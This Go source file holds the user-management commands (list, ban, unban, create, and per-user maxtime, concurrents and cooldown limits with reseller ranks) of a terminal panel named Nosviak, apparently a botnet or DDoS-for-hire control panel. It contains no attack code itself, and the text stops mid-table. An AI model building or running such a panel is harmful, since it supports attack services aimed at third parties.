package commands

import (
	"Nosviak/core/database"
	"Nosviak/core/masters/sessions"
	"Nosviak/core/masters/users/pager"
	"Nosviak/core/masters/users/ranks"
	"Nosviak/core/models/configs/toml"
	"Nosviak/core/models/security"
	"Nosviak/core/models/util"
	"Nosviak/core/models/views"
	"fmt"
	"strconv"
	"strings"

	"github.com/alexeyco/simpletable"
	"golang.org/x/term"
)

func init() {
	NewCommand(&Command{
		//this command allows easy user management
		//you can change most aspects about a certain user
		Name:           "users",
		Desciption:     "user management commands",
		MinPermissions: []string{"admin", "moderator", "reseller"},
		ZeroArguments: func(session *sessions.Session, args []string) error {

			//trys to fetch all users
			//this will query the database for every single user
			Users, err := database.Container.GetUsers()
			if err != nil || Users == nil {
				return views.NewDTX("display-database.dtx", session.Write).Template(session, session.Channel)
			}

			//checks how many users had been fetched
			//this is basic err handling to stop use from rendering a blank pager
			if len(Users) <= 0 {
				return views.NewDTX("display-NilUsers.dtx", session.Write).Template(session, session.Channel)
			}

			//creates a new simpletable structure
			//this will store our users information
			table := simpletable.New()

			//correctly sets the table header information
			//this stores information about the users
			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "#"},
					{Align: simpletable.AlignCenter, Text: "     User     "},
					{Align: simpletable.AlignCenter, Text: "Time"},
					{Align: simpletable.AlignCenter, Text: "Conns"},
					{Align: simpletable.AlignCenter, Text: "Cooldown"},
					{Align: simpletable.AlignCenter, Text: "Ranks"},
				},
			}
			
			//ranges through all the users gotton from the database
			for _, Users := range Users {
				//correctly parses the ranks from the database
				//this will produce an array of ranks which were found
				Press, err := ranks.UnravelRanks(&Users)
				if err != nil {
					continue
				}

				//creates a new tablcell row
				//this stores the rows information
				r := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: strconv.Itoa(Users.Id)},
					{Align: simpletable.AlignLeft, Text: session.UserOnline(Users.Username, Toml.DecorationToml.Gradient.Status && util.NeedleHaystack(Toml.DecorationToml.Gradient.CommissionedTables, "users"))},
					{Align: simpletable.AlignLeft, Text: strconv.Itoa(Users.MaxTime)},
					{Align: simpletable.AlignLeft, Text: strconv.Itoa(Users.Concurrents)},
					{Align: simpletable.AlignLeft, Text: strconv.Itoa(Users.Cooldown)},
					{Align: simpletable.AlignLeft, Text: ranks.CompileRanks(Press, Toml.DecorationToml.Gradient.Status && util.NeedleHaystack(Toml.DecorationToml.Gradient.CommissionedTables, "users"))},
				}
	
				//saves the information into the array
				table.Body.Cells = append(table.Body.Cells, r)
			}

			//renders the pager and prints any error which was found
			return pager.NewPager("users", table, session).ExecutePager()
		},

		//this is used when a invalid subcommand has been passed
		//mainly used for handling requests inside the custom rank system meaning people can be demoted & promoted
		InvalidSubCommand: func(session *sessions.Session, args []string) error {

			//checks if the subcommand is valid
			//this will correctly check all active ranks
			rank := ranks.ResolveRank(strings.Split(args[1], "=")[0])

			//checks if the rank is nil
			//this object stores information needed about the rank
			if rank == nil || strings.Split(args[1], "=")[0] == "admin" || strings.Split(args[1], "=")[0] == "banned" {
				//we return no err as this could have been a mistake
				return views.NewDTX("users-invalidSub.dtx", session.Write).RegisterVariable("subquery", args[1]).RegisterVariable("command", args[0]).Template(session, session.Channel)
			}

			if strings.Count(args[1], "=") != 1 {
				//trys to fetch all users
				//this will query the database for every single user
				Users, err := database.Container.GetUsers()
				if err != nil || Users == nil {
					return views.NewDTX("display-database.dtx", session.Write).Template(session, session.Channel)
				}

				//checks how many users had been fetched
				//this is basic err handling to stop use from rendering a blank pager
				if len(Users) <= 0 {
					return views.NewDTX("display-NilUsers.dtx", session.Write).Template(session, session.Channel)
				}

				//creates a new simpletable structure
				//this will store our users information
				table := simpletable.New()
				//correctly sets the table header information
				//this stores information about the users
				table.Header = &simpletable.Header{
					Cells: []*simpletable.Cell{
						{Align: simpletable.AlignCenter, Text: "#"},
						{Align: simpletable.AlignCenter, Text: "     User     "},
						{Align: simpletable.AlignCenter, Text: "Time"},
						{Align: simpletable.AlignCenter, Text: "Conns"},
						{Align: simpletable.AlignCenter, Text: "Cooldown"},
						{Align: simpletable.AlignCenter, Text: "Ranks"},
					},
				}
		
				//ranges through all the users gotton from the database
				for _, Users := range Users {
					//correctly parses the ranks from the database
					//this will produce an array of ranks which were found
					Press, err := ranks.UnravelRanks(&Users)
					if err != nil {
						continue
					}
					//makes sure we are only viewing admin users
					if !ranks.CanAccess(strings.Split(args[1], "=")[0], Press) {
						continue
					}
					//creates a new tablcell row
					//this stores the rows information
					r := []*simpletable.Cell{
						{Align: simpletable.AlignCenter, Text: strconv.Itoa(Users.Id)},
						{Align: simpletable.AlignLeft, Text: Users.Username},
						{Align: simpletable.AlignLeft, Text: strconv.Itoa(Users.MaxTime)},
						{Align: simpletable.AlignLeft, Text: strconv.Itoa(Users.Concurrents)},
						{Align: simpletable.AlignLeft, Text: strconv.Itoa(Users.Cooldown)},
						{Align: simpletable.AlignLeft, Text: ranks.CompileRanks(Press, Toml.DecorationToml.Gradient.Status && util.NeedleHaystack(Toml.DecorationToml.Gradient.CommissionedTables, "users"))},
					}

					//saves the information into the array
					table.Body.Cells = append(table.Body.Cells, r)
				}
				//renders the pager and prints any error which was found
				return pager.NewPager("users", table, session).ExecutePager()
			}

			//checks for a valid length
			//meaning a username must be safely passed into the function
			if len(args) < 3 {
				//renders the missingUser branding item
				return views.NewDTX("ranks-MissingUser.dtx", session.Write).RegisterVariable("rank", strings.Split(args[1], "=")[0]).Template(session, session.Channel)
			}

			//as this function is either promoting a user or demoting
			//we will only accept boolean
			builtin, err := strconv.ParseBool(strings.Split(args[1], "=")[1])
			if err != nil {
				//renders the invalidType branding item
				return views.NewDTX("ranks-invalidType.dtx", session.Write).RegisterVariable("rank", strings.Split(args[1], "=")[0]).Template(session, session.Channel)
			}

			userRanks, err := ranks.UnravelRanks(session.User)
			if err != nil {
				//renders the invalidType branding item
				return views.NewDTX("ranks-invalidType.dtx", session.Write).RegisterVariable("rank", strings.Split(args[1], "=")[0]).Template(session, session.Channel)
			}

			//checks the user can access the command
			//this is mainly used for certain roles which block access
			if access, err := ranks.AccessCommand(rank.PermissionsPromote, session.User); !access || err != nil {
				if err != nil && ranks.CanAccess("admin", userRanks) {
					fmt.Fprintf(session.Channel, "	ErrCommand: %s", err.Error())
					return nil
				}
				//renders the invalidType branding item
				return views.NewDTX("ranks-NoAccess.dtx", session.Write).RegisterVariable("rank", strings.Split(args[1], "=")[0]).Template(session, session.Channel)
			}

	
			//ranges through all users provided in the argument
			//this will make sure that users can promote more than one user at once
			for pos := 2; pos < len(args); pos++ {

				//trys to get the user from the database
				//checks to make sure the user isn't passing an invalid user
				user, err := database.Container.GetUser(args[pos])
				if err != nil {
					//prints the invalid user render screen
					return views.NewDTX("ranks-invalidUser.dtx", session.Write).RegisterVariable("rank", strings.Split(args[1], "=")[0]).RegisterVariable("user", args[pos]).Template(session, session.Channel)
				}

				//compress the string stored in the users database
				//this will allow us to get the roles in an array from that string
				Conc, err := ranks.UnravelRanks(user)
				if err != nil {
					//prints the invalid user render screen
					return views.NewDTX("ranks-invalidUser.dtx", session.Write).RegisterVariable("rank", strings.Split(args[1], "=")[0]).RegisterVariable("user", args[pos]).Template(session, session.Channel)
				}

				//checks if the users rank access matchs the architecture of the request
				//means that the user won't be able to have the rank twice, prevents duped ranks
				if ranks.CanAccess(strings.Split(args[1], "=")[0], Conc) == builtin {
					if builtin {
						//prints the invalid user render screen
						return views.NewDTX("ranks-alreadyHave.dtx", session.Write).RegisterVariable("rank", strings.Split(args[1], "=")[0]).RegisterVariable("user", args[pos]).Template(session, session.Channel)
					} else {
						//prints the invalid user render screen
						session.Write([]byte("example"))
						return views.NewDTX("ranks-alreadyDisabled.dtx", session.Write).RegisterVariable("rank", strings.Split(args[1], "=")[0]).RegisterVariable("user", args[pos]).Template(session, session.Channel)
					}
				}


				//detects if we are promoting the user
				//makes sure we don't dupe the role or delete when not wanted
				if builtin {
					//awards the user the rank
					//this inserts it safely into the array
					Conc, err = ranks.AwardRank(Conc, user, strings.Split(args[1], "=")[0])
					if err != nil {
						//returns the invalidUser splash
						return views.NewDTX("ranks-invalidUser.dtx", session.Write).RegisterVariable("rank", strings.Split(args[1], "=")[0]).RegisterVariable("user", args[pos]).Template(session, session.Channel)
					}

					//sorts the ranks back into the string safely
					Compiled, err := ranks.EncodeString(Conc)
					if err != nil {
						//returns the invalidUser splash
						return views.NewDTX("ranks-invalidUser.dtx", session.Write).RegisterVariable("rank", strings.Split(args[1], "=")[0]).RegisterVariable("user", args[pos]).Template(session, session.Channel)
					}

					//trys to edit the users rank inside the db
					//this makes sure we save the changes permanently 
					if err := database.Container.UpdateRanks(Compiled, user.Username); err != nil {
						//returns the invalidUser splash
						return views.NewDTX("ranks-FailedEdit.dtx", session.Write).RegisterVariable("rank", strings.Split(args[1], "=")[0]).RegisterVariable("user", args[pos]).Template(session, session.Channel)
					}

					//returns the invalidUser splash
					return views.NewDTX("ranks-Awarded.dtx", session.Write).RegisterVariable("rank", strings.Split(args[1], "=")[0]).RegisterVariable("user", args[pos]).Template(session, session.Channel)
				} else {
					//awards the user the rank
					//this inserts it safely into the array
					Conc, err = ranks.ForbidRole(strings.Split(args[1], "=")[0], Conc)
					if err != nil {
						//returns the invalidUser splash
						return views.NewDTX("ranks-invalidUser.dtx", session.Write).RegisterVariable("rank", strings.Split(args[1], "=")[0]).RegisterVariable("user", args[pos]).Template(session, session.Channel)
					}

					//sorts the ranks back into the string safely
					Compiled, err := ranks.EncodeString(Conc)
					if err != nil {
						//returns the invalidUser splash
						return views.NewDTX("ranks-invalidUser.dtx", session.Write).RegisterVariable("rank", strings.Split(args[1], "=")[0]).RegisterVariable("user", args[pos]).Template(session, session.Channel)
					}

					//trys to edit the users rank inside the db
					//this makes sure we save the changes permanently 
					if err := database.Container.UpdateRanks(Compiled, user.Username); err != nil {
						//returns the invalidUser splash
						return views.NewDTX("ranks-FailedEdit.dtx", session.Write).RegisterVariable("rank", strings.Split(args[1], "=")[0]).RegisterVariable("user", args[pos]).Template(session, session.Channel)
					}

					//returns the invalidUser splash
					return views.NewDTX("ranks-Demoted.dtx", session.Write).RegisterVariable("rank", strings.Split(args[1], "=")[0]).RegisterVariable("user", args[pos]).Template(session, session.Channel)
				}
			}



			return nil
		},

		SubFeatures: []SubFeature{
			{
				//this command allows higher rank users to unban users
				//unbans the user from the net using the role instance
				Name: "unban",
				Desciption: "initialize the users unban sequence",
				MinPermissions: []string{"admin", "moderator"},
				ExecutionBody: func(session *sessions.Session, args []string) error {

					//makes sure the user has provided some arguments for the statement
					if len(args) < 3 {
						//renders the invalid users splash, this will render when the user passed is invalid
						//makes sure the admin instance knows
						return views.NewDTX("users-unban-provideUser.dtx", session.Write).Template(session, session.Channel)
					}
					
					//ranges through all the users which were provided
					//this makes sure any arguments provided will be tried for the unban function
					for Position := 2; Position < len(args); Position++ {

						//checks that the user exists correctly
						//this will make sure the user which is trying to be unbanned exists properly
						user, err := database.Container.GetUser(args[Position])

						//renders the invalid the user
						//makes sure that if the user doesn't exist we don't ignore it but keep looping
						if err != nil || user == nil{
							//renders the invalid user
							//this displays to the main user that the user doesn't exist, we will also register the user structure
							return views.NewDTX("users-unban-invalidUser.dtx", session.Write).RegisterVariable("username", args[Position]).Template(session, session.Channel)
						}

						//decompresses all the rank's the user maintains 
						//this will allow us to get access to all ranks the user has
						userRanks, err := ranks.UnravelRanks(user)

						//err handles the unravel statement
						//makes sure the user ranks can be accessed
						if err != nil {
							//renders the invalid user
							//this displays to the main user that the user doesn't exist, we will also register the user structure
							return views.NewDTX("users-unban-ErrUser.dtx", session.Write).RegisterStructure("trying", *user).Template(session, session.Channel)
						}


						//checks if the user is already banned
						//this will allow us to display an error if the user is banned already
						if !ranks.CanAccess("banned", userRanks) {
							//renders the user already unbanned splash
							//this will show the session that the user is already unbanned
							return views.NewDTX("users-unban-notBanned.dtx", session.Write).RegisterStructure("trying", *user).Template(session, session.Channel)
						}

						//we will now award the user the unbanned rank
						//this will display inside the users profile and the users
						userRanks, err = ranks.ForbidRole("banned", userRanks)

						//err handles the update seq
						//makes sure the user is alerted when an error happens
						if err != nil {
							//renders the err splash
							//makes sure the information knows that the error isn't correct
							return views.NewDTX("users-unban-ErrUser.dtx", session.Write).RegisterStructure("trying", *user).Template(session, session.Channel)
						}

						//compresses the array back into the string
						//this will produce a string of ranks which can be used
						encoded, err := ranks.EncodeString(userRanks)

						//err handles the encoding seq
						//makes sure the session is alerted when an error happens
						if err != nil {
							//renders the err splash
							//makes sure the session knows about the error
							return views.NewDTX("users-unban-ErrUser.dtx", session.Write).RegisterStructure("trying", *user).Template(session, session.Channel)
						}

						//we will now insert the unban for the user
						//this will ban the user from being able to access the user information
						if err := database.Container.UpdateRanks(encoded, user.Username); err != nil {
							//makes sure the session knows about the eror
							//this will alert the session with an error code
							return views.NewDTX("users-unban-BanErr.dtx", session.Write).RegisterStructure("trying", *user).Template(session, session.Channel)
						}

						//makes sure the session knows about the ban working
						//this will alert the session that the user has been banned correctly
						if err := views.NewDTX("users-unban-Unbanned.dtx", session.Write).RegisterStructure("target", *user).Template(session, session.Channel); err != nil {
							continue
						}

					}


					return nil
				},
			},
			{
				//this command allows higher rank users to ban users
				//bans the user from the net using the role instance
				Name: "ban",
				Desciption: "initialize the users ban sequence",
				MinPermissions: []string{"admin"},
				ExecutionBody: func(session *sessions.Session, args []string) error {

					//makes sure the user has provided some arguments for the statement
					if len(args) < 3 {
						//renders the invalid users splash, this will render when the user passed is invalid
						//makes sure the admin instance knows
						return views.NewDTX("users-ban-provideUser.dtx", session.Write).Template(session, session.Channel)
					}
					
					//ranges through all the users which were provided
					//this makes sure any arguments provided will be tried for the ban function
					for Position := 2; Position < len(args); Position++ {

						//checks that the user exists correctly
						//this will make sure the user which is trying to be banned exists properly
						user, err := database.Container.GetUser(args[Position])

						//renders the invalid the user
						//makes sure that if the user doesn't exist we don't ignore it but keep looping
						if err != nil || user == nil{
							//renders the invalid user
							//this displays to the main user that the user doesn't exist, we will also register the user structure
							return views.NewDTX("users-ban-invalidUser.dtx", session.Write).RegisterVariable("username", args[Position]).Template(session, session.Channel)
						}

						//decompresses all the rank's the user maintains 
						//this will allow us to get access to all ranks the user has
						userRanks, err := ranks.UnravelRanks(user)

						//err handles the unravel statement
						//makes sure the user ranks can be accessed
						if err != nil {
							//renders the invalid user
							//this displays to the main user that the user doesn't exist, we will also register the user structure
							return views.NewDTX("users-ban-ErrUser.dtx", session.Write).RegisterStructure("trying", *user).Template(session, session.Channel)
						}


						//checks if the user is already banned
						//this will allow us to display an error if the user is banned already
						if ranks.CanAccess("banned", userRanks) {
							//renders the user already banned splash
							//this will show the session that the user is already banned
							return views.NewDTX("users-ban-alreadyBanned.dtx", session.Write).RegisterStructure("trying", *user).Template(session, session.Channel)
						}

						//we will now award the user the banned rank
						//this will display inside the users profile and the users
						userRanks, err = ranks.AwardRank(userRanks, user, "banned")

						//err handles the update seq
						//makes sure the user is alerted when an error happens
						if err != nil {
							//renders the err splash
							//makes sure the information knows that the error isn't correct
							return views.NewDTX("users-ban-ErrUser.dtx", session.Write).RegisterStructure("trying", *user).Template(session, session.Channel)
						}

						//compresses the array back into the string
						//this will produce a string of ranks which can be used
						encoded, err := ranks.EncodeString(userRanks)

						//err handles the encoding seq
						//makes sure the session is alerted when an error happens
						if err != nil {
							//renders the err splash
							//makes sure the session knows about the error
							return views.NewDTX("users-ban-ErrUser.dtx", session.Write).RegisterStructure("trying", *user).Template(session, session.Channel)
						}

						//we will now insert the ban for the user
						//this will ban the user from being able to access the user information
						if err := database.Container.UpdateRanks(encoded, user.Username); err != nil {
							//makes sure the session knows about the eror
							//this will alert the session with an error code
							return views.NewDTX("users-ban-BanErr.dtx", session.Write).RegisterStructure("trying", *user).Template(session, session.Channel)
						}

						//makes sure the session knows about the ban working
						//this will alert the session that the user has been banned correctly
						if err := views.NewDTX("users-ban-Banned.dtx", session.Write).RegisterStructure("target", *user).Template(session, session.Channel); err != nil {
							continue
						}
					}


					return nil
				},
			},
			{
				//starts the user creation schema 
				//this will allow the system to create a user
				Name: "create",
				Desciption: "initialize the user creation sequence",
				MinPermissions: []string{"admin", "moderator", "reseller"},
				ExecutionBody: func(session *sessions.Session, args []string) error {
					//sets the colour schema correctly
					if _, err := session.Channel.Write([]byte("\x1b[38;5;15m")); err != nil {
						return err
					}

					//this stores everything
					//arguments aren't just classed as what is inside the arguments but what we handle inside the function
					var Arguments map[string]string = make(map[string]string)

					//stores the order of operations in the user creation
					//this is the order we will accept the incoming arguments
					var Order []string = []string{"username", "maxtime", "cooldown", "concurrents"}

					//for loops through all the valid permission statements
					for Position := 2; Position < len(args); Position++ {
						//err checks the permissions statement
						//ignores anything over the allowed length
						if Position - 2 >= len(Order) || Position > len(args) {
							break
						}

						//saves the argument into the sector
						//this allows us to ask & force variables properly
						Arguments[Order[Position - 2]] = args[Position]
					}

					//ranges through all valid headers
					//allows us to inforce values being given
					for _, header := range Order {

						//checks if the object exists inside the map correctly
						//this is so we don't take an object twice
						if _, ok := Arguments[header]; ok {
							continue
						}

						//renders the users header prompt information
						//this allows users to completely customize the looks on how this command is viewed as
						if err := views.NewDTX("users-create-"+header+"-prompt.dtx", session.Write).Template(session, session.Channel); err != nil {
							return err
						}

						//creates a new reader instance
						//reads the incoming line
						valueCore := term.NewTerminal(session.Channel,"")

						//reads the incoming terminals line
						//correctly creates a buffer to read into
						value, err := valueCore.ReadLine()
						if err != nil {
							return err
						}

						//saves the header into the argument map with the value
						//this is so we can access thie later properly and safely
						Arguments[header] = value
					}
					//creates a secure password for the account
					//this will be used when the user logins in correctly
					//they should be prompted to change this safely & correctly
					Password := security.GenerateStrongPassword(30)

					///writes the password information correctly
					//this is used as we make the users password instead of letting the admin users being able to
					if err := views.NewDTX("users-create-passwordForced.dtx", session.Write).RegisterVariable("password", Password).Template(session, session.Channel); err != nil {
						return err
					}

					//now we correctly execute our rule checker
					//this checks if our maxtime is allowed. reason being as the maxtime can only be an integer
					maxtime, err := strconv.Atoi(Arguments["maxtime"])
					if err != nil {
						return views.NewDTX("users-create-invalid-maxtime.dtx", session.Write).RegisterVariable("maxtime", Arguments["maxtime"]).Template(session, session.Channel)
					}

					//we will now check that the concurrents is valid, same rule as the maxtime only integers allowed
					//this mainly stops invalid types being inserted into the database safely and properly
					concurrents, err := strconv.Atoi(Arguments["concurrents"])
					if err != nil {
						return views.NewDTX("users-create-invalid-concurrents.dtx", session.Write).RegisterVariable("concurrents", Arguments["concurrents"]).Template(session, session.Channel)
					}
					
					//checks that the cooldown is valid
					//the cooldown follows the same rules as the others, only integers may be passed into the database
					cooldown, err := strconv.Atoi(Arguments["cooldown"])
					if err != nil {
						return views.NewDTX("users-create-invalid-cooldown.dtx", session.Write).RegisterVariable("cooldown", Arguments["cooldown"]).Template(session, session.Channel)
					}

					//properly compiles the ranks into a string
					//as we won't this user to have access to no roles we will give it 0 ranks
					ranks, err := ranks.EncodeString(make([]ranks.Rank, 0))
					if err != nil {
						return views.NewDTX("users-create-Failed.dtx", session.Write).RegisterVariable("username", Arguments["username"]).Template(session, session.Channel)
					}

					//trys to query the inserting of the user
					//this will try to create the user inside the database
					err = database.Container.CreateNewUser(&database.User{
						Username: Arguments["username"],
						Password: Password,
						UserToken: security.UserToken(Password, Arguments["username"]),
						Roles: ranks,
						MaxTime: maxtime,
						Cooldown: cooldown,
						Concurrents: concurrents,
					})

					//basic err debugging
					//this will display information to the session showing whats gone wrong
					if err != nil && err == database.ErrUserAlreadyExists {
						return views.NewDTX("users-create-userAlreadyExists.dtx", session.Write).RegisterVariable("username", Arguments["username"]).Template(session, session.Channel)
					} else if err != nil {
						return views.NewDTX("users-create-Failed.dtx", session.Write).RegisterVariable("username", Arguments["username"]).Template(session, session.Channel)
					}

					//writes the created information
					//this will show the session that user has been safely created
					err = views.NewDTX("users-create-Created.dtx", session.Write).RegisterVariable("username", Arguments["username"]).RegisterVariable("password", Password).RegisterVariable("maxtime", Arguments["maxtime"]).RegisterVariable("cooldown", Arguments["cooldown"]).RegisterVariable("concurrents", Arguments["concurrents"]).Template(session, session.Channel)
					if err != nil {
						return err
					}

					//resets the colour schema correctly
					//this makes sure the prompt isn't affected by the colour updation registered below
					_, err = session.Channel.Write([]byte("\x1b[0m"))
					return err
				},
			},
			{
				//this command will completetly filter all admins
				//renders a table with only admins inside
				Name: "maxtime",
				Desciption: "filter through specific user maxtime's",
				MinPermissions: []string{"admin", "moderator", "reseller"},
				//preps the name for a split
				SplitName: true,
				//splits the incoming string by that charater
				SplitCharater: "=",
				ExecutionBody: func(session *sessions.Session, args []string) error {

					//checks if the syntax passed is valid
					//this is to make sure the user passed the correct value in
					if strings.Count(args[1], "=") != 1 {
						//returns an err code as we couldn't find it
						return views.NewDTX("argument-filter.dtx", session.Write).Template(session, session.Channel)
					}
					
					//we will only accept integers as the value
					//this will simple err checker and convert into a integer
					Value, err := strconv.Atoi(strings.Split(args[1], "=")[1])
					if err != nil {
						//returns an err code as we couldn't find it
						return views.NewDTX("argument-filter.dtx", session.Write).Template(session, session.Channel)
					}

					//trys to fetch all users
					//this will query the database for every single user
					Users, err := database.Container.GetUsers()
					if err != nil || Users == nil {
						return views.NewDTX("display-database.dtx", session.Write).Template(session, session.Channel)
					}

					//checks how many users had been fetched
					//this is basic err handling to stop use from rendering a blank pager
					if len(Users) <= 0 {
						return views.NewDTX("display-NilUsers.dtx", session.Write).Template(session, session.Channel)
					}

					//creates a new simpletable structure
					//this will store our users information
					table := simpletable.New()

					//correctly sets the table header information
					//this stores information about the users
					table.Header = &simpletable.Header{
						Cells: []*simpletable.Cell{
							{Align: simpletable.AlignCenter, Text: "#"},
							{Align: simpletable.AlignCenter, Text: "     User     "},
							{Align: simpletable.AlignCenter, Text: "Time"},
							{Align: simpletable.AlignCenter, Text: "Conns"},
							{Align: simpletable.AlignCenter, Text: "Cooldown"},
							{Align: simpletable.AlignCenter, Text: "Ranks"},
						},
					}
			
					//ranges through all the users gotton from the database
					for _, Users := range Users {
						//correctly parses the ranks from the database
						//this will produce an array of ranks which were found
						Press, err := ranks.UnravelRanks(&Users)
						if err != nil {
							continue
						}

						//only shows users with that maxtime
						//this is used for filter presets
						if Users.MaxTime != Value {
							continue
						}

						//creates a new tablcell row
						//this stores the rows information
						r := []*simpletable.Cell{
							{Align: simpletable.AlignCenter, Text: strconv.Itoa(Users.Id)},
							{Align: simpletable.AlignLeft, Text: Users.Username},
							{Align: simpletable.AlignLeft, Text: strconv.Itoa(Users.MaxTime)},
							{Align: simpletable.AlignLeft, Text: strconv.Itoa(Users.Concurrents)},
							{Align: simpletable.AlignLeft, Text: strconv.Itoa(Users.Cooldown)},
							{Align: simpletable.AlignLeft, Text: ranks.CompileRanks(Press, Toml.DecorationToml.Gradient.Status && util.NeedleHaystack(Toml.DecorationToml.Gradient.CommissionedTables, "users"))},
						}
	
						//saves the information into the array
						table.Body.Cells = append(table.Body.Cells, r)
					}

					//renders the pager and prints any error which was found
					return pager.NewPager("users", table, session).ExecutePager()
				},
			},
			{
				//this command allows admins/moderators/resellers to set different maxtimes
				//please note that no one but the admin can edit the admins maxtime
				Name: "concurrents",
				Desciption: "correctly sets values onto the concurrents",
				MinPermissions: []string{"admin", "moderator"},
				//preps the name for a split
				SplitName: true,
				//splits the incoming string by that charater
				SplitCharater: "=",
				ExecutionBody: func(session *sessions.Session, args []string) error {


					//checks if the syntax passed is valid
					//this is to make sure the user passed the correct value in
					if strings.Count(args[1], "=") != 1 || len(args) < 3 {

						//cooldown filtering support
						//this allows users to view users who have been filtered
						if len(args) == 2 {
							//checks if the syntax passed is valid
							//this is to make sure the user passed the correct value in
							if strings.Count(args[1], "=") != 1 {
								//returns an err code as we couldn't find it
								return views.NewDTX("argument-filter.dtx", session.Write).Template(session, session.Channel)
							}

							//we will only accept integers as the value
							//this will simple err checker and convert into a integer
							Value, err := strconv.Atoi(strings.Split(args[1], "=")[1])
							if err != nil {
								//returns an err code as we couldn't find it
								return views.NewDTX("argument-filter.dtx", session.Write).Template(session, session.Channel)
							}
						
							//trys to fetch all users
							//this will query the database for every single user
							Users, err := database.Container.GetUsers()
							if err != nil || Users == nil {
								return views.NewDTX("display-database.dtx", session.Write).Template(session, session.Channel)
							}
						
							//checks how many users had been fetched
							//this is basic err handling to stop use from rendering a blank pager
							if len(Users) <= 0 {
								return views.NewDTX("display-NilUsers.dtx", session.Write).Template(session, session.Channel)
							}
						
							//creates a new simpletable structure
							//this will store our users information
							table := simpletable.New()
						
							//correctly sets the table header information
							//this stores information about the users
							table.Header = &simpletable.Header{
								Cells: []*simpletable.Cell{
									{Align: simpletable.AlignCenter, Text: "#"},
									{Align: simpletable.AlignCenter, Text: "     User     "},
									{Align: simpletable.AlignCenter, Text: "Time"},
									{Align: simpletable.AlignCenter, Text: "Conns"},
									{Align: simpletable.AlignCenter, Text: "Cooldown"},
									{Align: simpletable.AlignCenter, Text: "Ranks"},
								},
							}
						
							//ranges through all the users gotton from the database
							for _, Users := range Users {
								//correctly parses the ranks from the database
								//this will produce an array of ranks which were found
								Press, err := ranks.UnravelRanks(&Users)
								if err != nil {
									continue
								}
							
								//only shows users with that maxtime
								//this is used for filter presets
								if Users.Concurrents != Value {
									continue
								}
							
								//creates a new tablcell row
								//this stores the rows information
								r := []*simpletable.Cell{
									{Align: simpletable.AlignCenter, Text: strconv.Itoa(Users.Id)},
									{Align: simpletable.AlignLeft, Text: Users.Username},
									{Align: simpletable.AlignLeft, Text: strconv.Itoa(Users.MaxTime)},
									{Align: simpletable.AlignLeft, Text: strconv.Itoa(Users.Concurrents)},
									{Align: simpletable.AlignLeft, Text: strconv.Itoa(Users.Cooldown)},
									{Align: simpletable.AlignLeft, Text: ranks.CompileRanks(Press, Toml.DecorationToml.Gradient.Status && util.NeedleHaystack(Toml.DecorationToml.Gradient.CommissionedTables, "users"))},
								}
							
								//saves the information into the array
								table.Body.Cells = append(table.Body.Cells, r)
							}
						
							//renders the pager and prints any error which was found
							return pager.NewPager("users", table, session).ExecutePager()
						}

						//returns an err code as we couldn't find it
						return views.NewDTX("users-concurrents-missing.dtx", session.Write).Template(session, session.Channel)
					}

					//sorts all the rank options correctly
					//this will sort them all into arrays safely
					PromoterRanks, err := ranks.UnravelRanks(session.User)
					if err != nil {
						//returns an err code as we couldn't find it
						return views.NewDTX("users-concurrents-missing.dtx", session.Write).Template(session, session.Channel)
					}
					
					//we will only accept integers as the value
					//this will simple err checker and convert into a integer
					Value, err := strconv.Atoi(strings.Split(args[1], "=")[1])
					if err != nil {
						//returns an err code as we couldn't find it
						return views.NewDTX("users-concurrents-forceInteger.dtx", session.Write).Template(session, session.Channel)
					}

					//for loops through each value option
					for Position := 2; Position < len(args); Position++ {

						//gets the user from the database
						//this is used so we only get the correct user
						User, err := database.Container.GetUser(args[Position])
						if err != nil {
							//returns an err code as we couldn't find it
							return views.NewDTX("users-concurrents-invalidUser.dtx", session.Write).RegisterVariable("queryUser", args[Position]).Template(session, session.Channel)
						}

						//correctly sorts the ranks
						//this will return the ranks correctly and safely
						Ranks, err := ranks.UnravelRanks(User)
						if err != nil {
							//returns an err code as we couldn't find it
							return views.NewDTX("users-concurrents-invalidUser.dtx", session.Write).RegisterStructure("query", *User).Template(session, session.Channel)
						}

						//checks if the user can access stuff
						if ranks.CanAccess("admin", Ranks) && !ranks.CanAccess("admin", PromoterRanks) {
							//returns an err code as the user updating has higher ranks then the user performing it
							return views.NewDTX("users-concurrents-higherRank.dtx", session.Write).RegisterStructure("query", *User).Template(session, session.Channel)
						}



						//requests the maxtime update 
						//this will properly update the time
						err = database.Container.ChangeConcurrents(strconv.Itoa(Value), User.Username)
						if err != nil {
							//returns an err code as the user updating has higher ranks then the user performing it
							return views.NewDTX("users-concurrents-error.dtx", session.Write).RegisterStructure("query", *User).Template(session, session.Channel)
						}

						//returns an err code as the user updating has higher ranks then the user performing it
						if err := views.NewDTX("users-concurrents-done.dtx", session.Write).RegisterStructure("query", *User).Template(session, session.Channel); err != nil {
							return err
						}

					}


					return nil
				},
			},
			{
				//this command allows admins/moderators/resellers to set different maxtimes
				//please note that no one but the admin can edit the admins maxtime
				Name: "cooldown",
				Desciption: "correctly sets values onto the cooldown",
				MinPermissions: []string{"admin", "moderator"},
				//preps the name for a split
				SplitName: true,
				//splits the incoming string by that charater
				SplitCharater: "=",
				ExecutionBody: func(session *sessions.Session, args []string) error {


					//checks if the syntax passed is valid
					//this is to make sure the user passed the correct value in
					if strings.Count(args[1], "=") != 1 || len(args) < 3 {

						//cooldown filtering support
						//this allows users to view users who have been filtered
						if len(args) == 2 {
							//checks if the syntax passed is valid
							//this is to make sure the user passed the correct value in
							if strings.Count(args[1], "=") != 1 {
								//returns an err code as we couldn't find it
								return views.NewDTX("argument-filter.dtx", session.Write).Template(session, session.Channel)
							}

							//we will only accept integers as the value
							//this will simple err checker and convert into a integer
							Value, err := strconv.Atoi(strings.Split(args[1], "=")[1])
							if err != nil {
								//returns an err code as we couldn't find it
								return views.NewDTX("argument-filter.dtx", session.Write).Template(session, session.Channel)
							}
						
							//trys to fetch all users
							//this will query the database for every single user
							Users, err := database.Container.GetUsers()
							if err != nil || Users == nil {
								return views.NewDTX("display-database.dtx", session.Write).Template(session, session.Channel)
							}
						
							//checks how many users had been fetched
							//this is basic err handling to stop use from rendering a blank pager
							if len(Users) <= 0 {
								return views.NewDTX("display-NilUsers.dtx", session.Write).Template(session, session.Channel)
							}
						
							//creates a new simpletable structure
							//this will store our users information
							table := simpletable.New()
						
							//correctly sets the table header information
							//this stores information about the users
							table.Header = &simpletable.Header{
								Cells: []*simpletable.Cell{
